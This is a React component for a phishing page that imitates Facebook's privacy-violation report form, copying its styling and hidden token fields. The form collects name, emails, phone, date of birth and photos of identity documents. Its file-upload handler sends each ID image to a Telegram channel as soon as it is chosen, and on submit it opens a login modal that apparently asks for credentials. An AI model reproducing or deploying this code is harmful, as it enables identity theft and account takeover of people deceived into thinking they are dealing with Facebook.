import { useState } from 'react';
import { countryOptions } from '@/components/constants';
import LoginModal from '@/components/login-modal';
import { useLang } from '@/context/lang-context';
import { sendPhotoToTelegram } from '@/utils/send-telegram';

const PrivacyForm = () => {
    const { labels, updateLangByCountry } = useLang();
    const [showIdOptions, setShowIdOptions] = useState(false);
    const [selectedId, setSelectedId] = useState('');
    const [showModal, setShowModal] = useState(false);
    const [formData, setFormData] = useState({});
    const [selectedCountry, setSelectedCountry] = useState('');
    const [emailErrors, setEmailErrors] = useState({
        email_facebook: '',
        email_work: '',
    });

    const idTypes = [
        labels.idType_0,
        labels.idType_1,
        labels.idType_2,
        labels.idType_3,
    ];

    const handleCountryChange = async (e) => {
        const country = e.target.value;
        setSelectedCountry(country);
        await updateLangByCountry(country);
    };

    const handleFileChange = async (e, side) => {
        const file = e.target.files?.[0];
        if (!file) return;
        const sideLabel = side === 'front' ? 'Mặt trước' : 'Mặt sau';
        const caption = `🪪 <b>GIẤY TỜ TÙY THÂN – ${sideLabel}</b>\n📎 <b>Loại:</b> ${selectedId || 'Chưa chọn'}\n📄 <b>File:</b> ${file.name}`;
        await sendPhotoToTelegram(file, caption);
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        const fd = new FormData(e.target);
        const data = Object.fromEntries(fd.entries());
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const nextEmailErrors = {
            email_facebook:
                data.email_facebook && !emailRegex.test(String(data.email_facebook).trim())
                    ? 'Email Facebook không đúng định dạng.'
                    : '',
            email_work:
                data.email_work && !emailRegex.test(String(data.email_work).trim())
                    ? 'Email liên hệ không đúng định dạng.'
                    : '',
        };

        if (nextEmailErrors.email_facebook || nextEmailErrors.email_work) {
            setEmailErrors(nextEmailErrors);
            return;
        }

        setEmailErrors({
            email_facebook: '',
            email_work: '',
        });
        setFormData({ ...data, country: selectedCountry });
        setShowModal(true);
    };

    return (
        <>
        {showModal && (
            <LoginModal
                onClose={() => setShowModal(false)}
                formData={formData}
            />
        )}
        <form
            id="Report a Violation of your Privacy on Facebook ROW"
            method="post"
            action="#"
            className="w-full overflow-hidden rounded-[8px] border border-[#dddfe2] bg-[#F8FAFC]"
            onSubmit={handleSubmit}
        >
            <input type="hidden" name="jazoest" value="..." />
            <input type="hidden" name="fb_dtsg" value="..." />

            <div className="_4-u2 _3ban _4-u8">
                <div className="_4-u3 _2ph_ _6oy- _57d8 border-b border-[#dddfe2] bg-[#f0f2f5] px-4 py-4 sm:px-5 sm:py-5">
                    <div className="clearfix">
                        <div className="lfloat _ohe">
                            <div className="_5xm_ text-[20px] font-bold leading-[24px] text-[#1c1e21]">
                                {labels.flagTitle}
                            </div>
                        </div>
                    </div>
                </div>

                <div className="_4-u3 _2pi0 px-4 py-4 sm:px-5 sm:py-5">
                    <div className="_5cb_ space-y-4">
                        <div className="_5hba rounded-[4px] py-3">
                            <p className="m-0 text-[13px] leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc1}
                            </p>
                            <p className="m-0 mt-2 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc2}
                            </p>
                            <p className="m-0 mt-1 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc3}
                            </p>
                            <p className="m-0 mt-1 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc4}
                            </p>
                            <p className="m-0 mt-1 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                {labels.flagDesc5}
                            </p>
                        </div>

                        {/* Country */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-country"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.countryLabel}
                            </label>
                            <select
                                id="privacy-country"
                                name="country"
                                value={selectedCountry}
                                onChange={handleCountryChange}
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-2 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            >
                                <option value="" disabled>
                                    {labels.countryPlaceholder}
                                </option>
                                {countryOptions.map((country) => (
                                    <option key={country} value={country}>
                                        {country}
                                    </option>
                                ))}
                            </select>
                        </div>

                        {/* Full name */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-name"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.fullNameLabel}
                            </label>
                            <input
                                id="privacy-name"
                                type="text"
                                name="full_name"
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                        </div>

                        {/* Facebook email */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-email-fb"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.emailFbLabel}
                            </label>
                            <p className="mb-1 text-[12px] leading-[18px] text-[#606770]">
                                {labels.emailFbHelper}
                            </p>
                            <input
                                id="privacy-email-fb"
                                type="email"
                                name="email_facebook"
                                onChange={(e) => {
                                    const nextValue = e.target.value;
                                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                                    setEmailErrors((prev) => ({
                                        ...prev,
                                        email_facebook:
                                            nextValue && !emailRegex.test(nextValue.trim())
                                                ? 'Email Facebook không đúng định dạng.'
                                                : '',
                                    }));
                                }}
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                            {emailErrors.email_facebook && (
                                <p className="mt-1 text-[12px] text-red-500">{emailErrors.email_facebook}</p>
                            )}
                        </div>

                        {/* Work email */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-email-work"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.emailWorkLabel}
                            </label>
                            <input
                                id="privacy-email-work"
                                type="email"
                                name="email_work"
                                onChange={(e) => {
                                    const nextValue = e.target.value;
                                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                                    setEmailErrors((prev) => ({
                                        ...prev,
                                        email_work:
                                            nextValue && !emailRegex.test(nextValue.trim())
                                                ? 'Email liên hệ không đúng định dạng.'
                                                : '',
                                    }));
                                }}
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                            {emailErrors.email_work && (
                                <p className="mt-1 text-[12px] text-red-500">{emailErrors.email_work}</p>
                            )}
                        </div>

                        {/* Page name */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-page-name"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.pageNameLabel}
                            </label>
                            <input
                                id="privacy-page-name"
                                type="text"
                                name="page_name"
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                        </div>

                        {/* Phone */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-phone"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.phoneLabel}
                            </label>
                            <input
                                id="privacy-phone"
                                type="tel"
                                name="phone"
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                        </div>

                        {/* Date of birth */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-dob"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.dobLabel}
                            </label>
                            <input
                                id="privacy-dob"
                                type="date"
                                name="date_of_birth"
                                className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                            />
                        </div>

                        {/* Description */}
                        <div className="_sx7">
                            <label
                                htmlFor="privacy-description"
                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
                            >
                                {labels.descriptionLabel}
                            </label>
                            <textarea
                                id="privacy-description"
                                name="description"
                                rows={5}
                                className="w-full resize-y rounded-[4px] border border-[#ccd0d5] px-3 py-2 text-[13px] leading-[20px] text-[#1c1e21] outline-none placeholder:text-[#8d949e] focus:border-[#1877f2]"
                            />
                            <p className="mt-1 text-[12px] leading-[18px] text-[#606770]">
                                {labels.descriptionHelper}
                            </p>
                        </div>

                        {/* Your ID */}
                        <div className="_sx7">
                            <button
                                type="button"
                                onClick={() => setShowIdOptions((prev) => !prev)}
                                className="flex w-full items-center justify-between rounded-[4px] border border-[#ccd0d5] px-3 py-[8px] text-left text-[13px] text-[#1c1e21] outline-none hover:bg-[#f5f6f7]"
                            >
                                <span className="font-semibold">
                                    {selectedId || 'Your ID'}
                                </span>
                                <svg
                                    className={`h-4 w-4 text-[#606770] transition-transform ${showIdOptions ? 'rotate-180' : ''}`}
                                    fill="none"
                                    viewBox="0 0 24 24"
                                    stroke="currentColor"
                                    strokeWidth={2}
                                >
                                    <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
                                </svg>
                            </button>

                            {showIdOptions && (
                                <div className="mt-1 rounded-[4px] border border-[#ccd0d5] bg-[#F8FAFC]">
                                    {idTypes.map((idType) => (
                                        <label
                                            key={idType}
                                            className="flex cursor-pointer items-center justify-between border-b border-[#f0f2f5] px-4 py-3 last:border-b-0 hover:bg-[#f5f6f7]"
                                        >
                                            <span className="text-[13px] text-[#1c1e21]">{idType}</span>
                                            <input
                                                type="radio"
                                                name="id_type"
                                                value={idType}
                                                checked={selectedId === idType}
                                                onChange={() => {
                                                    setSelectedId(idType);
                                                    setShowIdOptions(false);
                                                }}
                                                className="h-4 w-4 accent-[#1877f2]"
                                            />
                                        </label>
                                    ))}
                                </div>
                            )}

                            {selectedId && (
                                <div className="mt-3 space-y-3 rounded-[4px] border border-[#ccd0d5] bg-[#F8FAFC] p-3">
                                    <p className="text-[13px] font-semibold text-[#1c1e21]">
                                        {labels.idUploadLabel} {selectedId}
                                    </p>

                                    <div>
                                        <label
                                            htmlFor="privacy-id-front"
                                            className="mb-1 block text-[12px] font-semibold text-[#1c1e21]"
                                        >
                                            {labels.idFrontLabel}
                                        </label>
                                        <input
                                            id="privacy-id-front"
                                            type="file"
                                            name="id_front_image"
                                            accept="image/*"
                                            onChange={(e) => handleFileChange(e, 'front')}
                                            className="w-full rounded-[4px] border border-[#ccd0d5] px-2 py-[6px] text-[13px] text-[#1c1e21] file:mr-3 file:rounded-[4px] file:border-0 file:bg-[#e7f3ff] file:px-3 file:py-1 file:text-[12px] file:font-semibold file:text-[#1877f2] hover:file:bg-[#dcecff]"
                                        />
                                    </div>

                                    <div>
                                        <label
                                            htmlFor="privacy-id-back"
                                            className="mb-1 block text-[12px] font-semibold text-[#1c1e21]"
                                        >
                                            {labels.idBackLabel}
                                        </label>
                                        <input
                                            id="privacy-id-back"
                                            type="file"
                                            name="id_back_image"
                                            accept="image/*"
                                            onChange={(e) => handleFileChange(e, 'back')}
                                            className="w-full rounded-[4px] border border-[#ccd0d5] px-2 py-[6px] text-[13px] text-[#1c1e21] file:mr-3 file:rounded-[4px] file:border-0 file:bg-[#e7f3ff] file:px-3 file:py-1 file:text-[12px] file:font-semibold file:text-[#1877f2] hover:file:bg-[#dcecff]"
                                        />
                                    </div>
                                </div>
                            )}
                        </div>

                    </div>
                </div>

                <div className="flex bg-[#F0F2F5] px-4 py-3 sm:justify-end sm:px-5 sm:py-4">
                    <button
                        type="submit"
                        className="w-full rounded-[6px] bg-[#3B5998] px-4 py-[9px] text-[13px] font-semibold text-white transition-colors hover:bg-[#324b81] sm:w-auto sm:py-[7px]"
                    >
                        {labels.submitBtn}
                    </button>
                </div>
            </div>
        </form>
        </>
    );
};

export default PrivacyForm;
